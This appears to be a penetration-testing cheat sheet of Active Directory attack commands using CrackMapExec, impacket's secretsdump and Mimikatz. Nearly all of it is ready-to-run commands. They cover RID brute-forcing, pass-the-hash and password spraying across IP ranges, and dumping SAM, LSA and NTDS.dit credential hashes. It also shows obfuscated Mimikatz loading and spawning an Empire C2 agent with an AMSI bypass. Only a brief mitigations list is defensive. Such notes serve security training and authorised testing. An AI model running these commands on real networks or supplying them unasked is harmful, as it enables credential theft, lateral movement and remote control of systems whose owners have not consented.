## CrackMapExec is now known as NetExec, please see the NetExec section now.
```
Enumerating AD users without wordlists using crackmapexec (RID bruteforce)
    crackmapexec smb $ip -u anonymous -p '' -d domain.name --rid-brute (anonymous login)

PtH
In this attack we pass the credentials in entire network range to see in how many devices we can logon(Password reuse). 
We can either use the hashes (last portion of ntlm hash) or plaintext password and pass em around using crackmapexec
    NOTE:NTLM hashes can be passed but NTLMv2 hashes cannot be passed
    NOTE: See all the available modules in crackmapexec ,they can be useful for post exploitation activities

    passing hashes/passwords for a domain user
    crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password -d domainname

    passing hashes/passwords of local pc users
    crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password --local-auth

-If we want to continue hash passing/password spraying , use the --continue-on-success flag
    we can also use multiple other flags like dump sam,lsa secrets,ntds.dit etc
    crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password -d domainname --sam or --lsa or --ntds


CME Mimikatz
We can also use modules in crackmap exec like mimikatz,powerview etc
https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/

Enumerate all shares and its contents
    crackmapexec smb IP-RANGE/ADDRESSES -u userame -H hash or password -d domain.name -M spider_plus

    we can enumerate other things like users,shares,sessions etc
    crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password --shares or --users or --groups etc



We can load powershell scripts in memory and obfuscate them

Powershell Obfuscation:
Options for PowerShell script obfuscation

--obfs Obfuscate PowerShell scripts --clear-obfscripts Clear all cached obfuscated PowerShell scripts
    crackmapexec smb 192.168.125.133 -u fcastle -p 'Password1' -d HYDRA.local -M mimikatz --obfs

We can also use empire framework module to get a agent back for a c2 channel. We can also add custom amsi bypass file
    crackmapexec smb 192.168.125.133 -u fcastle -p 'Password1' -d HYDRA.local -M empire_exec -o LISTENER=final --amsi-bypass bypassfile

    Mitigations
    Avoid reusing local admin passwords across the network
    only set privelges to user as they require (principle of least privilege)
    Set strong complex password policy
    use PAM and autorotate passwords on daily basis

Dump Hashes in a network
Remotely
    we can use multiple flags like dump sam,lsa secrets,ntds.dit etc
    crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password -d domainname --sam or --lsa or --ntds

we can try to dump ntds using two different methods

    --ntds
    --ntds vss (Volume shadow method)

    secretsdump.py domain/username:password@IPADDRESS or secretsdump.py domain/username@IPADDRESS -H hash
    secretsdump.py -just-dc-ntlm domain.name/username@IPADDRESS

Or Locally in our machine by copying dumped SAM hives
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam samfile -system systemfile LOCAL

    NTDS.dit Dumping
Good resource= https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration

LOCALLY :
If we have access to domain controller we can directly dump ntds.dit through powershell:
    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

This will dump a ntds and system hive in specified directory. We can then copy it back to our machine and dump hashes using secretsdump.py
    /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local

REMOTELY:
If we have valid credentials for a domain controller then we can dump all the hashes directly from our machine
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm domain.name/username@IPADDRESS crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password -d domainname --ntds

On Disk Using Mimikatz
Note : If we are administrator or similiar privileges but we are getting error on running mimikatz , list down the process and migrate to a process running as administrator . Same goes for if we are system but our process might be in administrator contex

    First open the mimikatz binary
    Now type in following to get us system privileges on mimikatz shell

privilege::debug token::elevate

If we want we could log Mimikatz output with the log command. For example: log c:\windows\temp\mimikatz.log, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.

    We can now dump the hashes using the follwoing command

    lsadump::sam (FOR NORMAL windows)

OR

    sekurlsa::logonpasswords (Dump hashes from current active sessions)

OR

    lsadump::lsa /patch (for Windows AD server)
```
